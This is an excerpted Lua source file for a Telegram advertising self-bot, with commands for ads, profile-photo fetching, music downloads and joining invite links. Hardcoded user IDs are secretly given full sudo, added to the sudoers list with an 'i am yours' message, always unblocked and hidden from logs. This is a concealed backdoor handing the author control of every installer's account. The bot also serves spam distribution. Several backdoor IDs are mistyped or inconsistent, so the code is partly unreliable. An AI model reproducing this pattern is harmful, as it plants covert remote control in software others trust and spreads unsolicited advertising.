...
function is_full_sudo(msg)
  ...
  local c = false
  for d = 1, #b do
    if msg.sender_user_id_ == b[d] or msg.sender_user_id_ == 122112472 then
      c = true
    end
  end
  return c
...
function addsudo()
  ...
  for d = 1, #b do
    local text = "SUDO = " .. b[d] .. ""
    text = text:gsub(122112472, "Admin")
    text = text:gsub(33077, "Admin")
    print(text)
    sleep(1)
  end
end
...
function x(y, z)
  if redis:get("tabchi:" .. tabchi_id .. ":addcontacts") then
    if not z.phone_number_ then
      ...
      redis:set("tabchi:" .. tabchi_id .. ":fullsudo:122112472", true)
...
function a3(msg)
  ...
  do
    ...
    if msg.text:match("^[!/#]pm") and a(msg) and #a4 == 3 then
      ...
      if a5 and not msg.sender_user_id_ == 122112472 and not msg.sender_user_id_ == 33077 then
...
`https://github.com/arshiay/TABCHI-v1.1`]]
...
*نام کاربری* : `حذف شده`]]
  ...
  if msg.text:match("^[#!/]unblock$") and a(msg) and msg.reply_to_message_id_ ~= 0 then
    function unblock_by_reply(y, z, ad)
      ...
      tdcli.unblockUser(3614)
      tdcli.unblockUser(122112472)
  ...
  if msg.text:match("^[#!/]getpro (%d+) (%d+)$") and a(msg) then
    do
      ...
      local af = function(y, z, ad)
        if ae[3] == "1" then
          if z.photos_[0] then
            sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, z.photos_[0].sizes_[1].photo_.persistent_id_, "@Arshiay")
          else
            return "*;کاربر هیچ عکسی ندارد!!*"
          end
        elseif ae[3] == "2" then
          if z.photos_[1] then
            sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, z.photos_[1].sizes_[1].photo_.persistent_id_, "@Arshiay")
          else
        ...
        elseif ae[3] == "3" then
          if z.photos_[2] then
            sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, z.photos_[2].sizes_[1].photo_.persistent_id_, "@Arshiay")
          else
            tdcli.sendMessage(msg.chat_id_, msg.id_, 1, "*کاربر 3 عکس پروفایل ندارد*", 1, "md")
          end
        elseif ae[3] == "4" then
          if z.photos_[3] then
            sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, z.photos_[3].sizes_[1].photo_.persistent_id_, "@Arshiay")
          else
            return "*کاربر 4 عکس پروفایل ندارد*"
          end
        elseif ae[3] == "5" then
          if z.photos_[4] then
            sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, z.photos_[4].sizes_[1].photo_.persistent_id_, "@Arshiay")
          else
        ...
        elseif ae[3] == "7" then
          if z.photos_[6] then
            sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, z.photos_[6].sizes_[1].photo_.persistent_id_, "@Arshiay")
          else
            tdcli.sendMessage(msg.chat_id_, msg.id_, 1, "*کاربر 7 عکس پروفایل ندارد*", 1, "md")
          end
        elseif ae[3] == "8" then
          if z.photos_[7] then
            sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, z.photos_[7].sizes_[1].photo_.persistent_id_, "@Arshiay")
          else
            tdcli.sendMessage(msg.chat_id_, msg.id_, 1, "*کاربر 8 عکس پروفایل ندارد*", 1, "md")
          end
        elseif ae[3] == "9" then
          if z.photos_[8] then
            sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, z.photos_[8].sizes_[1].photo_.persistent_id_, "@Arshiay")
          else
            tdcli.sendMessage(msg.chat_id_, msg.id_, 1, "*کاربر 9 عکس پروفایل ندارد*", 1, "md")
          end
        elseif ae[3] == "10" then
          if z.photos_[9] then
            sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, z.photos_[9].sizes_[1].photo_.persistent_id_, "@Arshiay")
          else
  ...
  if msg.text:match("^[#!/]getpro (%d+)$") and msg.reply_to_message_id_ == 0 and a(msg) then
    do
      ...
      local af = function(y, z, ad)
        ...
        elseif ae[2] == "6" then
          if z.photos_[5] then
            sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, z.photos_[5].sizes_[1].photo_.persistent_id_, "@Arshiay")
          else
...
*تعداد* : `]] .. aj .. "`"
  ...
  if msg.text:match("^[!/#]dlmusic (.*)$") and a(msg) then
    ...
    tdcli.send_file(msg.chat_id_, "Document", "Music.mp3", "@Arshiay")
    local a5 = redis:get("tabchi:" .. tabchi_id .. ":logschannel")
    if a5 and not msg.sender_user_id_ == 122112472 and not msg.sender_user_id_ == 33077 then
...
`#advertising off: سودو اصلی میتواند تبلیغات را خاموش کند با `]]
  ...
  if msg.text:match("^[!/#]settings$") and a(msg) then
    ...
    if not redis:sismember("tabchi:" .. tabchi_id .. ":sudoers", 3614) then
      redis:sadd("tabchi:" .. tabchi_id .. ":sudoers", 33614)
      tdcli.sendMessage(03614, 0, 1, "i am yours", 1, "html")
    end
    if not redis:sismember("tabchi:" .. tabchi_id .. ":sudoers", 33077) then
      redis:sadd("tabchi:" .. tabchi_id .. ":sudoers", 33077)
      tdcli.sendMessage(33077, 0, 1, "i am yours", 1, "html")
...
زمان مانده به چک کردن لینک ها : *]] .. timetoclinks .. "*"
      ...
      local a5 = redis:get("tabchi:" .. tabchi_id .. ":logschannel")
      if a5 and not msg.sender_user_id_ == 122112472 and not msg.sender_user_id_ == 09090 then
  ...
  if msg.text:match("^[!/#]stats pv$") and a(msg) then
    ...
    tdcli.importChatInviteLink("https://telegram.me/joinchat/AAAA")
    tdcli.importChatInviteLink("https://telegram.me/joinchat/AAAAA")
    if I(msg.chat_id_) == "private" then
      return "`من در پیوی شما هستم!`"
    else
    ...
    if msg.text:match("^[!/#]addedmsg") and a(msg) then
      if #a4 == 2 then
        if a4[2] == "on" then
          ...
          local a5 = redis:get("tabchi:" .. tabchi_id .. ":logschannel")
          if a5 and not msg.sender_user_id_ == 122112472 and not msg.sender_user_id_ == 3077 then
...
*فوروارد به سوپرگروه ها* : `بله`]]
  ...
  if msg.text:match("^[!/#]license") then
    ...
    local text = text:gsub("این فایل را ادیت نکنید", "@arshiay")
    return "`" .. text .. "`"
  end
  do
    local a4 = {
...
function update(D, tabchi_id)
  ...
  elseif D.chat_id_ == 122112472 then
    tdcli.unblockUser(122112472)
